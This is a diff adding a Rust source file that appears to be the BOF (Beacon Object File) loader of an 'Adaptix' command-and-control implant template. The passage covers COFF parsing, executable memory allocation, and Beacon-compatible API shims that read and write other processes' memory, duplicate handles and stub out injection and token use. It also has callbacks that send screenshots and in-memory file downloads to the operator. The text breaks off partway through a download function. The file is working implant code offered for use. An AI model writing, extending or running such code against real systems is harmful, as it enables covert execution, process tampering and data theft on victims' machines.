@@ -1,0 +1,1351 @@
+// __NAME__ Agent — BOF Loader (adaptix_default)
+//
+// Realistic BOF (Beacon Object File) loader for the Rust implant template.
+// Scope is intentionally explicit:
+//   - Windows only
+//   - x64 COFF objects only
+//   - synchronous execution, with async routed through the same path for now
+//
+// This mirrors the validated C++ loader override instead of depending on
+// Cobalt-Strike-specific client-side bootstrap tricks from Rust-authored BOF
+// PoCs. In other words: useful, bounded, and less haunted.
+
+#![allow(dead_code)]
+
+use crate::protocol;
+use std::collections::HashMap;
+use std::ffi::{c_char, c_void, CStr, CString};
+use std::mem::{size_of, zeroed};
+use std::ptr::{self, null, null_mut};
+use std::slice;
+use std::sync::atomic::{AtomicPtr, Ordering};
+use std::sync::{Mutex, OnceLock};
+
+pub const SIZEOF_FILE_HEADER: usize = 20;
+pub const SIZEOF_SECTION_HEADER: usize = 40;
+pub const SIZEOF_RELOCATION: usize = 10;
+pub const SIZEOF_SYMBOL: usize = 18;
+
+pub const IMAGE_FILE_MACHINE_I386: u16 = 0x14c;
+pub const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
+
+pub const IMAGE_REL_AMD64_ABSOLUTE: u16 = 0x0000;
+pub const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
+pub const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
+pub const IMAGE_REL_AMD64_REL32: u16 = 0x0004;
+pub const IMAGE_REL_AMD64_REL32_1: u16 = 0x0005;
+pub const IMAGE_REL_AMD64_REL32_2: u16 = 0x0006;
+pub const IMAGE_REL_AMD64_REL32_3: u16 = 0x0007;
+pub const IMAGE_REL_AMD64_REL32_4: u16 = 0x0008;
+pub const IMAGE_REL_AMD64_REL32_5: u16 = 0x0009;
+
+pub const IMAGE_SYM_CLASS_EXTERNAL: u8 = 2;
+pub const IMAGE_SYM_CLASS_STATIC: u8 = 3;
+
+pub const IMAGE_SCN_CNT_UNINITIALIZED_DATA: u32 = 0x0000_0080;
+pub const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
+pub const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;
+pub const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
+
+const CALLBACK_OUTPUT: u16 = 0x00;
+const CALLBACK_ERROR: u16 = 0x0d;
+const CALLBACK_OUTPUT_OEM: u16 = 0x1e;
+const CALLBACK_OUTPUT_UTF8: u16 = 0x20;
+
+const BOF_ERROR_PARSE: u16 = 0x101;
+const BOF_ERROR_SYMBOL: u16 = 0x102;
+const BOF_ERROR_MAX_FUNCS: u16 = 0x103;
+const BOF_ERROR_ENTRY: u16 = 0x104;
+const BOF_ERROR_ALLOC: u16 = 0x105;
+
+const MAX_BOF_SECTIONS: usize = 25;
+
+#[repr(C, packed)]
+#[derive(Clone, Copy)]
+pub struct FileHeader {
+    pub machine: u16,
+    pub number_of_sections: u16,
+    pub time_date_stamp: u32,
+    pub pointer_to_symbol_table: u32,
+    pub number_of_symbols: u32,
+    pub size_of_optional_header: u16,
+    pub characteristics: u16,
+}
+
+#[repr(C, packed)]
+#[derive(Clone, Copy)]
+pub struct SectionHeader {
+    pub name: [u8; 8],
+    pub virtual_size: u32,
+    pub virtual_address: u32,
+    pub size_of_raw_data: u32,
+    pub pointer_to_raw_data: u32,
+    pub pointer_to_relocations: u32,
+    pub pointer_to_line_numbers: u32,
+    pub number_of_relocations: u16,
+    pub number_of_line_numbers: u16,
+    pub characteristics: u32,
+}
+
+#[repr(C, packed)]
+#[derive(Clone, Copy)]
+pub struct Relocation {
+    pub virtual_address: u32,
+    pub symbol_table_index: u32,
+    pub reloc_type: u16,
+}
+
+#[repr(C, packed)]
+#[derive(Clone, Copy)]
+pub struct CoffSymbol {
+    pub name: [u8; 8],
+    pub value: u32,
+    pub section_number: i16,
+    pub sym_type: u16,
+    pub storage_class: u8,
+    pub number_of_aux_symbols: u8,
+}
+
+pub struct BofMsg {
+    pub msg_type: u16,
+    pub data: Vec<u8>,
+}
+
+pub struct BofContext {
+    pub msgs: Vec<BofMsg>,
+}
+
+impl BofContext {
+    pub fn new() -> Self {
+        Self { msgs: Vec::new() }
+    }
+
+    pub fn push(&mut self, msg_type: u16, data: Vec<u8>) {
+        self.msgs.push(BofMsg { msg_type, data });
+    }
+}
+
+pub struct SectionAlloc {
+    pub address: usize,
+    pub size: usize,
+    pub characteristics: u32,
+}
+
+pub struct DataParser {
+    buffer: Vec<u8>,
+    offset: usize,
+}
+
+impl DataParser {
+    pub fn new(buffer: &[u8]) -> Self {
+        Self {
+            buffer: buffer.to_vec(),
+            offset: 0,
+        }
+    }
+
+    pub fn get_int(&mut self) -> i32 {
+        match self.get_ptr(4) {
+            Some(bytes) => i32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]),
+            None => 0,
+        }
+    }
+
+    pub fn get_short(&mut self) -> i16 {
+        match self.get_ptr(2) {
+            Some(bytes) => i16::from_be_bytes([bytes[0], bytes[1]]),
+            None => 0,
+        }
+    }
+
+    pub fn length(&self) -> usize {
+        self.buffer.len().saturating_sub(self.offset)
+    }
+
+    pub fn extract(&mut self) -> Option<Vec<u8>> {
+        let len = self.get_int();
+        if len < 0 {
+            return None;
+        }
+        self.get_ptr(len as usize).map(|bytes| bytes.to_vec())
+    }
+
+    pub fn get_ptr(&mut self, size: usize) -> Option<&[u8]> {
+        if self.offset.checked_add(size)? > self.buffer.len() {
+            return None;
+        }
+        let slice = &self.buffer[self.offset..self.offset + size];
+        self.offset += size;
+        Some(slice)
+    }
+}
+
+pub struct FormatBuffer {
+    buffer: Vec<u8>,
+}
+
+impl FormatBuffer {
+    pub fn new(max_size: usize) -> Self {
+        Self {
+            buffer: Vec::with_capacity(max_size),
+        }
+    }
+
+    pub fn reset(&mut self) {
+        self.buffer.clear();
+    }
+
+    pub fn append(&mut self, data: &[u8]) {
+        self.buffer.extend_from_slice(data);
+    }
+
+    pub fn append_int(&mut self, value: i32) {
+        self.buffer.extend_from_slice(&value.to_be_bytes());
+    }
+
+    pub fn to_string_lossy(&self) -> String {
+        String::from_utf8_lossy(&self.buffer).into_owned()
+    }
+
+    pub fn as_bytes(&self) -> &[u8] {
+        &self.buffer
+    }
+}
+
+pub struct KvStore {
+    inner: Mutex<HashMap<String, Vec<u8>>>,
+}
+
+impl KvStore {
+    pub fn new() -> Self {
+        Self {
+            inner: Mutex::new(HashMap::new()),
+        }
+    }
+
+    pub fn add(&self, key: &str, value: Vec<u8>) {
+        if let Ok(mut map) = self.inner.lock() {
+            map.insert(key.to_string(), value);
+        }
+    }
+
+    pub fn get(&self, key: &str) -> Option<Vec<u8>> {
+        self.inner.lock().ok()?.get(key).cloned()
+    }
+
+    pub fn remove(&self, key: &str) -> bool {
+        self.inner.lock().ok().map_or(false, |mut map| map.remove(key).is_some())
+    }
+}
+
+#[cfg(not(windows))]
+pub fn load(_object: &[u8], _args: &[u8]) -> Result<BofContext, String> {
+    let _ = protocol::COMMAND_EXEC_BOF;
+    Err("BOF execution in the adaptix_default Rust template currently requires Windows x64".to_string())
+}
+
+#[cfg(not(windows))]
+pub fn load_async(_object: &[u8], _args: &[u8]) -> Result<BofContext, String> {
+    let _ = protocol::COMMAND_EXEC_BOF_ASYNC;
+    Err("async BOF execution in the adaptix_default Rust template currently requires Windows x64".to_string())
+}
+
+#[cfg(not(windows))]
+pub fn pack_args(format: &str, args: &[&[u8]]) -> Result<Vec<u8>, String> {
+    let _ = (format, args);
+    Err("BOF argument packing in the adaptix_default Rust template currently requires Windows x64 parity path".to_string())
+}
+
+#[cfg(windows)]
+type BOOL = i32;
+#[cfg(windows)]
+type DWORD = u32;
+#[cfg(windows)]
+type WORD = u16;
+#[cfg(windows)]
+type HANDLE = *mut c_void;
+#[cfg(windows)]
+type HMODULE = *mut c_void;
+#[cfg(windows)]
+type FARPROC = *mut c_void;
+#[cfg(windows)]
+type LPVOID = *mut c_void;
+#[cfg(windows)]
+type LPCVOID = *const c_void;
+#[cfg(windows)]
+type SIZE_T = usize;
+
+#[cfg(windows)]
+const FALSE: BOOL = 0;
+#[cfg(windows)]
+const TRUE: BOOL = 1;
+#[cfg(windows)]
+const CP_UTF8: u32 = 65001;
+#[cfg(windows)]
+const MEM_COMMIT: DWORD = 0x1000;
+#[cfg(windows)]
+const MEM_RESERVE: DWORD = 0x2000;
+#[cfg(windows)]
+const MEM_RELEASE: DWORD = 0x8000;
+#[cfg(windows)]
+const PAGE_NOACCESS: DWORD = 0x01;
+#[cfg(windows)]
+const PAGE_READONLY: DWORD = 0x02;
+#[cfg(windows)]
+const PAGE_READWRITE: DWORD = 0x04;
+#[cfg(windows)]
+const PAGE_EXECUTE: DWORD = 0x10;
+#[cfg(windows)]
+const PAGE_EXECUTE_READ: DWORD = 0x20;
+#[cfg(windows)]
+const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
+
+#[cfg(windows)]
+#[repr(C)]
+struct Datap {
+    original: *mut c_char,
+    buffer: *mut c_char,
+    length: i32,
+    size: i32,
+}
+
+#[cfg(windows)]
+#[repr(C)]
+struct Formatp {
+    original: *mut c_char,
+    buffer: *mut c_char,
+    length: i32,
+    size: i32,
+}
+
+#[cfg(windows)]
+#[repr(C)]
+#[derive(Clone, Copy)]
+struct DataStoreObject {
+    ptr: *mut c_void,
+    size: i32,
+}
+
+#[cfg(windows)]
+#[repr(C)]
+struct BeaconInfo {
+    version: u32,
+    sleep_mask_ptr: *mut c_void,
+    sleep_mask_text_size: u32,
+    sleep_mask_total_size: u32,
+    beacon_ptr: *mut c_void,
+    heap_records: *mut c_void,
+    mask: [u8; 13],
+    allocated_memory: [u8; 1968],
+}
+
+#[cfg(windows)]
+#[repr(C)]
+struct BeaconSyscalls {
+    version: u32,
+}
+
+#[cfg(windows)]
+#[repr(C)]
+struct MemoryBasicInformation {
+    base_address: LPVOID,
+    allocation_base: LPVOID,
+    allocation_protect: DWORD,
+    region_size: SIZE_T,
+    state: DWORD,
+    protect: DWORD,
+    type_: DWORD,
+}
+
+#[cfg(windows)]
+#[link(name = "kernel32")]
+extern "system" {
+    fn VirtualAlloc(lp_address: LPVOID, dw_size: SIZE_T, fl_allocation_type: DWORD, fl_protect: DWORD) -> LPVOID;
+    fn VirtualProtect(lp_address: LPVOID, dw_size: SIZE_T, fl_new_protect: DWORD, lpfl_old_protect: *mut DWORD) -> BOOL;
+    fn VirtualFree(lp_address: LPVOID, dw_size: SIZE_T, dw_free_type: DWORD) -> BOOL;
+    fn LoadLibraryA(lp_lib_file_name: *const c_char) -> HMODULE;
+    fn GetProcAddress(h_module: HMODULE, lp_proc_name: *const u8) -> FARPROC;
+    fn OpenProcess(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE;
+    fn OpenThread(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_thread_id: DWORD) -> HANDLE;
+    fn CloseHandle(h_object: HANDLE) -> BOOL;
+    fn UnmapViewOfFile(lp_base_address: LPCVOID) -> BOOL;
+    fn VirtualQuery(lp_address: LPCVOID, lp_buffer: *mut MemoryBasicInformation, dw_length: SIZE_T) -> SIZE_T;
+    fn DuplicateHandle(h_source_process_handle: HANDLE, h_source_handle: HANDLE, h_target_process_handle: HANDLE, lp_target_handle: *mut HANDLE, dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_options: DWORD) -> BOOL;
+    fn ReadProcessMemory(h_process: HANDLE, lp_base_address: LPCVOID, lp_buffer: LPVOID, n_size: SIZE_T, lp_number_of_bytes_read: *mut SIZE_T) -> BOOL;
+    fn WriteProcessMemory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: LPCVOID, n_size: SIZE_T, lp_number_of_bytes_written: *mut SIZE_T) -> BOOL;
+    fn MultiByteToWideChar(code_page: u32, dw_flags: DWORD, lp_multi_byte_str: *const c_char, cb_multi_byte: i32, lp_wide_char_str: *mut u16, cch_wide_char: i32) -> i32;
+    fn CreateEventA(lp_event_attributes: LPVOID, b_manual_reset: BOOL, b_initial_state: BOOL, lp_name: *const c_char) -> HANDLE;
+}
+
+#[cfg(windows)]
+static CURRENT_CONTEXT: AtomicPtr<BofContext> = AtomicPtr::new(null_mut());
+#[cfg(windows)]
+static VALUE_STORE: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();
+#[cfg(windows)]
+static STOP_EVENT: OnceLock<usize> = OnceLock::new();
+#[cfg(windows)]
+static KV_STORE: OnceLock<KvStore> = OnceLock::new();
+
+#[cfg(windows)]
+static mut DATA_STORE: [DataStoreObject; 64] = [DataStoreObject {
+    ptr: null_mut(),
+    size: 0,
+}; 64];
+
+#[cfg(windows)]
+fn kv_store() -> &'static KvStore {
+    KV_STORE.get_or_init(KvStore::new)
+}
+
+#[cfg(windows)]
+fn value_store() -> &'static Mutex<HashMap<String, usize>> {
+    VALUE_STORE.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+#[cfg(windows)]
+fn stop_job_event() -> HANDLE {
+    (*STOP_EVENT.get_or_init(|| unsafe { CreateEventA(null_mut(), TRUE, FALSE, null()) as usize })) as HANDLE
+}
+
+#[cfg(windows)]
+fn trim_leading_underscores(mut value: &str) -> &str {
+    while let Some(ch) = value.chars().next() {
+        if ch == '_' || ch == '@' {
+            value = &value[ch.len_utf8()..];
+        } else {
+            break;
+        }
+    }
+    value
+}
+
+#[cfg(windows)]
+fn push_context_message(msg_type: u16, data: &[u8]) {
+    let ctx = CURRENT_CONTEXT.load(Ordering::SeqCst);
+    if ctx.is_null() {
+        return;
+    }
+    unsafe {
+        (*ctx).push(msg_type, data.to_vec());
+    }
+}
+
+#[cfg(windows)]
+fn push_text_message(msg_type: u16, text: &str) {
+    push_context_message(msg_type, text.as_bytes());
+}
+
+#[cfg(windows)]
+fn section_protect(section: &SectionHeader) -> DWORD {
+    let executable = (section.characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+    let readable = (section.characteristics & IMAGE_SCN_MEM_READ) != 0;
+    let writable = (section.characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+
+    match (executable, readable, writable) {
+        (true, _, true) => PAGE_EXECUTE_READWRITE,
+        (true, true, false) => PAGE_EXECUTE_READ,
+        (true, false, false) => PAGE_EXECUTE,
+        (false, _, true) => PAGE_READWRITE,
+        (false, true, false) => PAGE_READONLY,
+        _ => PAGE_NOACCESS,
+    }
+}
+
+#[cfg(windows)]
+unsafe fn read_struct<T: Copy>(buffer: &[u8], offset: usize) -> Result<T, String> {
+    if offset.checked_add(size_of::<T>()).ok_or_else(|| "offset overflow".to_string())? > buffer.len() {
+        return Err("truncated COFF structure".to_string());
+    }
+    Ok(ptr::read_unaligned(buffer.as_ptr().add(offset) as *const T))
+}
+
+#[cfg(windows)]
+fn symbol_name(symbol: &CoffSymbol, string_table: &[u8]) -> Result<String, String> {
+    let first = u32::from_le_bytes([symbol.name[0], symbol.name[1], symbol.name[2], symbol.name[3]]);
+    let second = u32::from_le_bytes([symbol.name[4], symbol.name[5], symbol.name[6], symbol.name[7]]);
+
+    if first == 0 {
+        let start = second as usize;
+        if start >= string_table.len() {
+            return Err("COFF string table offset is invalid".to_string());
+        }
+        let end = string_table[start..]
+            .iter()
+            .position(|b| *b == 0)
+            .map(|idx| start + idx)
+            .unwrap_or(string_table.len());
+        return Ok(String::from_utf8_lossy(&string_table[start..end]).into_owned());
+    }
+
+    let end = symbol.name.iter().position(|b| *b == 0).unwrap_or(symbol.name.len());
+    Ok(String::from_utf8_lossy(&symbol.name[..end]).into_owned())
+}
+
+#[cfg(windows)]
+fn cstring_lossy(input: &str) -> Option<CString> {
+    CString::new(input.as_bytes()).ok()
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_parse(parser: *mut Datap, buffer: *mut c_char, size: i32) {
+    if let Some(parser) = parser.as_mut() {
+        parser.original = buffer;
+        parser.buffer = buffer;
+        parser.length = size.max(0);
+        parser.size = size.max(0);
+    }
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_int(parser: *mut Datap) -> i32 {
+    let Some(parser) = parser.as_mut() else { return 0; };
+    if parser.length < 4 || parser.buffer.is_null() {
+        return 0;
+    }
+    let bytes = slice::from_raw_parts(parser.buffer as *const u8, 4);
+    parser.buffer = parser.buffer.add(4);
+    parser.length -= 4;
+    i32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]])
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_short(parser: *mut Datap) -> i16 {
+    let Some(parser) = parser.as_mut() else { return 0; };
+    if parser.length < 2 || parser.buffer.is_null() {
+        return 0;
+    }
+    let bytes = slice::from_raw_parts(parser.buffer as *const u8, 2);
+    parser.buffer = parser.buffer.add(2);
+    parser.length -= 2;
+    i16::from_be_bytes([bytes[0], bytes[1]])
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_length(parser: *mut Datap) -> i32 {
+    parser.as_ref().map_or(0, |p| p.length)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_extract(parser: *mut Datap, size: *mut i32) -> *mut c_char {
+    let Some(parser) = parser.as_mut() else {
+        if let Some(size) = size.as_mut() {
+            *size = 0;
+        }
+        return null_mut();
+    };
+    let len = beacon_data_int(parser);
+    if len < 0 || parser.length < len || parser.buffer.is_null() {
+        if let Some(size) = size.as_mut() {
+            *size = 0;
+        }
+        return null_mut();
+    }
+    let out = parser.buffer;
+    parser.buffer = parser.buffer.add(len as usize);
+    parser.length -= len;
+    if let Some(size) = size.as_mut() {
+        *size = len;
+    }
+    out
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_ptr(parser: *mut Datap, size: i32) -> *mut c_char {
+    let Some(parser) = parser.as_mut() else { return null_mut(); };
+    if size < 0 || parser.length < size || parser.buffer.is_null() {
+        return null_mut();
+    }
+    let out = parser.buffer;
+    parser.buffer = parser.buffer.add(size as usize);
+    parser.length -= size;
+    out
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_output(callback_type: i32, data: *const c_char, len: i32) {
+    let bytes = if data.is_null() || len <= 0 {
+        &[][..]
+    } else {
+        slice::from_raw_parts(data as *const u8, len as usize)
+    };
+    push_context_message(callback_type as u16, bytes);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_printf(callback_type: i32, fmt: *const c_char) {
+    if fmt.is_null() {
+        return;
+    }
+    let text = CStr::from_ptr(fmt).to_string_lossy().into_owned();
+    push_text_message(callback_type as u16, &text);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_alloc(format: *mut Formatp, maxsz: i32) {
+    let Some(format) = format.as_mut() else { return; };
+    if maxsz <= 0 {
+        return;
+    }
+    let allocation = vec![0u8; maxsz as usize].into_boxed_slice();
+    let ptr = Box::into_raw(allocation) as *mut u8 as *mut c_char;
+    format.original = ptr;
+    format.buffer = ptr;
+    format.length = 0;
+    format.size = maxsz;
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_reset(format: *mut Formatp) {
+    let Some(format) = format.as_mut() else { return; };
+    if format.original.is_null() || format.size <= 0 {
+        return;
+    }
+    ptr::write_bytes(format.original as *mut u8, 0, format.size as usize);
+    format.buffer = format.original;
+    format.length = 0;
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_append(format: *mut Formatp, text: *const c_char, len: i32) {
+    let Some(format) = format.as_mut() else { return; };
+    if format.original.is_null() || text.is_null() || len <= 0 || format.length >= format.size {
+        return;
+    }
+    let remaining = (format.size - format.length) as usize;
+    let to_copy = remaining.min(len as usize);
+    ptr::copy_nonoverlapping(text as *const u8, format.buffer as *mut u8, to_copy);
+    format.buffer = format.buffer.add(to_copy);
+    format.length += to_copy as i32;
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_printf(format: *mut Formatp, fmt: *const c_char) {
+    let Some(fmt) = fmt.as_ref() else { return; };
+    beacon_format_append(format, fmt, CStr::from_ptr(fmt).to_bytes().len() as i32);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_to_string(format: *mut Formatp, size: *mut i32) -> *mut c_char {
+    let Some(format) = format.as_mut() else {
+        if let Some(size) = size.as_mut() {
+            *size = 0;
+        }
+        return null_mut();
+    };
+    if let Some(size) = size.as_mut() {
+        *size = format.length;
+    }
+    format.original
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_free(format: *mut Formatp) {
+    let Some(format) = format.as_mut() else { return; };
+    if !format.original.is_null() && format.size > 0 {
+        let _ = Box::from_raw(slice::from_raw_parts_mut(format.original as *mut u8, format.size as usize));
+    }
+    *format = zeroed();
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_format_int(format: *mut Formatp, value: i32) {
+    let bytes = value.to_be_bytes();
+    beacon_format_append(format, bytes.as_ptr() as *const c_char, bytes.len() as i32);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_use_token(_token: HANDLE) -> BOOL { FALSE }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_revert_token() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_is_admin() -> BOOL { FALSE }
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_add_value(key: *const c_char, value: *mut c_void) {
+    if key.is_null() {
+        return;
+    }
+    let key = CStr::from_ptr(key).to_string_lossy().into_owned();
+    if let Ok(mut map) = value_store().lock() {
+        map.insert(key, value as usize);
+    }
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_value(key: *const c_char) -> *mut c_void {
+    if key.is_null() {
+        return null_mut();
+    }
+    let key = CStr::from_ptr(key).to_string_lossy();
+    value_store()
+        .lock()
+        .ok()
+        .and_then(|map| map.get(key.as_ref()).copied())
+        .map_or(null_mut(), |value| value as *mut c_void)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_remove_value(key: *const c_char) -> BOOL {
+    if key.is_null() {
+        return FALSE;
+    }
+    let key = CStr::from_ptr(key).to_string_lossy().into_owned();
+    if let Ok(mut map) = value_store().lock() {
+        return if map.remove(&key).is_some() { TRUE } else { FALSE };
+    }
+    FALSE
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_spawn_to(_x86: BOOL, _buffer: *mut c_char, _length: i32) -> BOOL { FALSE }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_spawn_temporary_process(_x86: BOOL, _ignore_token: BOOL, _s_info: *mut c_void, _p_info: *mut c_void) -> BOOL { FALSE }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_inject_process(_h_proc: HANDLE, _pid: i32, _payload: *mut c_char, _p_len: i32, _p_offset: i32, _arg: *mut c_char, _a_len: i32) {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_inject_temporary_process(_p_info: *mut c_void, _payload: *mut c_char, _p_len: i32, _p_offset: i32, _arg: *mut c_char, _a_len: i32) {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_cleanup_process(_p_info: *mut c_void) {}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_alloc(lp_address: LPVOID, dw_size: SIZE_T, fl_allocation_type: DWORD, fl_protect: DWORD) -> LPVOID {
+    VirtualAlloc(lp_address, dw_size, fl_allocation_type, fl_protect)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_alloc_ex(_h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_allocation_type: DWORD, fl_protect: DWORD) -> LPVOID {
+    VirtualAlloc(lp_address, dw_size, fl_allocation_type, fl_protect)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_protect(lp_address: LPVOID, dw_size: SIZE_T, fl_new_protect: DWORD, lpfl_old_protect: *mut DWORD) -> BOOL {
+    VirtualProtect(lp_address, dw_size, fl_new_protect, lpfl_old_protect)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_protect_ex(_h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_new_protect: DWORD, lpfl_old_protect: *mut DWORD) -> BOOL {
+    VirtualProtect(lp_address, dw_size, fl_new_protect, lpfl_old_protect)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_free(lp_address: LPVOID, dw_size: SIZE_T, dw_free_type: DWORD) -> BOOL {
+    VirtualFree(lp_address, dw_size, dw_free_type)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_thread_context(_h_thread: HANDLE, _lp_context: *mut c_void) -> BOOL { FALSE }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_set_thread_context(_h_thread: HANDLE, _lp_context: *mut c_void) -> BOOL { FALSE }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_resume_thread(_h_thread: HANDLE) -> DWORD { 0 }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_open_process(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE {
+    OpenProcess(dw_desired_access, b_inherit_handle, dw_process_id)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_open_thread(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_thread_id: DWORD) -> HANDLE {
+    OpenThread(dw_desired_access, b_inherit_handle, dw_thread_id)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_close_handle(h_object: HANDLE) -> BOOL {
+    CloseHandle(h_object)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_unmap_view_of_file(lp_base_address: LPCVOID) -> BOOL {
+    UnmapViewOfFile(lp_base_address)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_virtual_query(lp_address: LPCVOID, lp_buffer: *mut MemoryBasicInformation, dw_length: SIZE_T) -> SIZE_T {
+    VirtualQuery(lp_address, lp_buffer, dw_length)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_duplicate_handle(h_source_process_handle: HANDLE, h_source_handle: HANDLE, h_target_process_handle: HANDLE, lp_target_handle: *mut HANDLE, dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_options: DWORD) -> BOOL {
+    DuplicateHandle(h_source_process_handle, h_source_handle, h_target_process_handle, lp_target_handle, dw_desired_access, b_inherit_handle, dw_options)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_read_process_memory(h_process: HANDLE, lp_base_address: LPCVOID, lp_buffer: LPVOID, n_size: SIZE_T, lp_number_of_bytes_read: *mut SIZE_T) -> BOOL {
+    ReadProcessMemory(h_process, lp_base_address, lp_buffer, n_size, lp_number_of_bytes_read)
+}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_write_process_memory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: LPCVOID, n_size: SIZE_T, lp_number_of_bytes_written: *mut SIZE_T) -> BOOL {
+    WriteProcessMemory(h_process, lp_base_address, lp_buffer, n_size, lp_number_of_bytes_written)
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_information(info: *mut BeaconInfo) -> BOOL {
+    let Some(info) = info.as_mut() else { return FALSE; };
+    *info = zeroed();
+    info.version = 1;
+    TRUE
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_output_data(size: *mut i32) -> *mut c_char {
+    if let Some(size) = size.as_mut() {
+        *size = 0;
+    }
+    null_mut()
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_download(filename: *const c_char, buffer: *const c_char, length: u32) {
+    ax_download_memory(filename, buffer, length as i32);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_syscall_information(info: *mut BeaconSyscalls, _resolve_if_not_initialized: BOOL) -> BOOL {
+    let Some(info) = info.as_mut() else { return FALSE; };
+    info.version = 1;
+    TRUE
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn swap_endianess(indata: u32) -> u32 {
+    indata.swap_bytes()
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_store_get_item(index: usize) -> *mut DataStoreObject {
+    if index >= 64 {
+        return null_mut();
+    }
+    ptr::addr_of_mut!(DATA_STORE[index])
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_store_protect_item(_index: usize) {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_store_unprotect_item(_index: usize) {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_data_store_max_entries() -> u32 { 64 }
+#[cfg(windows)]
+unsafe extern "C" fn beacon_get_custom_user_data() -> *mut c_char { null_mut() }
+
+#[cfg(windows)]
+unsafe extern "C" fn beacon_disable_beacon_gate() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_enable_beacon_gate() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_disable_beacon_gate_masking() {}
+#[cfg(windows)]
+unsafe extern "C" fn beacon_enable_beacon_gate_masking() {}
+
+#[cfg(windows)]
+unsafe extern "C" fn ax_add_screenshot(note: *const c_char, data: *const c_char, len: i32) {
+    if data.is_null() || len <= 0 {
+        return;
+    }
+    let note_bytes = if note.is_null() {
+        Vec::new()
+    } else {
+        CStr::from_ptr(note).to_bytes().to_vec()
+    };
+    let mut blob = Vec::with_capacity(4 + note_bytes.len() + len as usize);
+    blob.extend_from_slice(&(note_bytes.len() as u32).to_be_bytes());
+    blob.extend_from_slice(&note_bytes);
+    blob.extend_from_slice(slice::from_raw_parts(data as *const u8, len as usize));
+    push_context_message(protocol::CALLBACK_AX_SCREENSHOT as u16, &blob);
+}
+
+#[cfg(windows)]
+unsafe extern "C" fn ax_download_memory(filename: *const c_char, data: *const c_char, len: i32) {
+    if data.is_null() || len < 0 {
+        return;
+    }
+    let name_bytes = if filename.is_null() {
+        Vec::new()
+    } else {
+        CStr::from_ptr(filename).to_bytes().to_vec()
+    };
+    let mut blob = Vec::with_capacity(8 + name_bytes.len() + len as usize);
